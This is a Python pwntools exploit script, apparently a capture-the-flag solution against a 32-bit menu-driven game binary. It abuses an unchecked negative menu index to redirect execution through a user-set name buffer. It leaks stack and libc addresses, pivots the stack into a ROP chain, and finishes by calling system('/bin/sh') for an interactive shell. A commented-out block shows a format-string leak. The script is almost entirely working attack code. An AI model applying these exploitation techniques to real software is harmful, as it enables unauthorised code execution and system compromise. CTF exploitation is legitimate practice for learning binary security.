from pwn import *
context.log_level = 'debug'

def menu(idx):
    io.recvuntil('>')
    io.sendline(str(idx))

def Settings_Name(name):
    menu(6)
    menu(2)
    io.recvuntil(':')
    io.sendline(name)
    menu(1) #back

def Multiplayer():
    menu(7)
    menu(1) #back

def Kill(why):
    menu(5)
    io.recvuntil('???? ')
    io.sendline(why)

puts_got = 0x805509c
puts_plt = 0x8048b90

Settings_Name(p64(puts_plt)) # use puts to leak stack addr
Multiplayer()
menu(-33) # didnt check the idx, so we can jmp to the g_name
io.recvuntil('-33\n')
stack_addr = u32(io.recvn(4))
log.info('stack_addr :' + hex(stack_addr))

stack_pivot = 0x8048e48
read_plt = 0x8048a70
ret_addr = 0x804a664
pop_esi_ret = 0x80499ef
map_tmp = 0x8057d80
ppp_r = 0x080494da

Settings_Name(p64(stack_pivot)) # pivot to stack and do rop
Multiplayer()
payload = str(-33).ljust(8, '\x00')
payload += p32(puts_plt)
payload += p32(pop_esi_ret)
payload += p32(puts_got)
payload += p32(read_plt)
payload += p32(ppp_r)
payload += p32(0)
payload += p32(stack_addr - 0xfffe3b70 + 0xfffe3ae8) # read to stack to launch a shell
payload += p32(0x100)

io.recvuntil('> ')
pause()
io.sendline(payload)
puts_libc = u32(io.recvn(4))
log.info('puts_libc :' + hex(puts_libc))
l = ELF('./libc')
system_libc = puts_libc - l.symbols['puts'] + l.symbols['system']
log.info('system_libc :' + hex(system_libc))
binsh = puts_libc - l.symbols['puts'] + l.search('/bin/sh').next()
log.info('binsh :' + hex(binsh))

payload2 = p32(system_libc)
payload2 += p32(binsh)
payload2 += p32(binsh)
io.sendline(payload2)

'''
#calc the idx
idx = (stack_addr - 0xb0 + 0xc - 0x8058154) / 4
if idx >= 0x80000000:
    idx = -(0x100000000 - idx)
log.info('idx :' + str(idx))

payload = str(idx).ljust(0xc, '\x00')
payload += 'aaaa'
io.recvuntil('>')
io.sendline(payload)

Kill('%p.%p.%p.%p') #this can bypass printf_chk
for i in range(0, 3):
    io.recvuntil('.')
libc_addr = int(io.recvuntil('\n')[2:-1], 16)
log.info('libc_addr :' + hex(libc_addr))
'''
io.interactive()
